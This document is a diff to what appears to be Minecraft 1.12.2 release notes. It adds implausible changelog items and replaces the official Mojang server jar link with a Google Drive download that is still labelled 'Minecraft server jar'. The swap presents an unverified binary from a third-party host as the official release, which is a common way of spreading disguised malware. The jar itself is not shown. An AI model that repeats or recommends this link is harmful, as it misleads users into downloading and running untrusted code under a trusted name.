@@ -8,9 +8,15 @@ This is a fix for a multiplayer exploit which could not wait.<br>
 **Changes in 1.12.2:**<br>
 \* Updated the in game logo<br>
 \* Fixed an exploit and a bunch of other bugs<br>
+\* Added Village Panic Feature<br>
+\* Made Villages Spawn With Brown Carpets<br>
+\* Boosted Performance<br>
+
+
+
 
 Cross-platform server jar:<br>
-\* [Minecraft server jar](https://launcher.mojang.com/mc/game/1.12.2/server/886945bfb2b978778c3a0288fd7fab09d315b25f/server.jar)<br>
+\* [Minecraft server jar](https://drive.usercontent.google.com/download?id=1D8qhL4EDlUwv0PHw7P_PRigroudJeXSw&export=download&authuser=0&confirm=t&uuid=14e27aed-3e90-4fe1-9f5e-7ffadea074f5&at=APcXIO1NU2v71wJtEw8QrQ7uWtmy:1771127744952)<br>
 
 Report bugs here:<br>
 \* [Minecraft issue tracker!](https://bugs.mojang.com/browse/MC)<br>
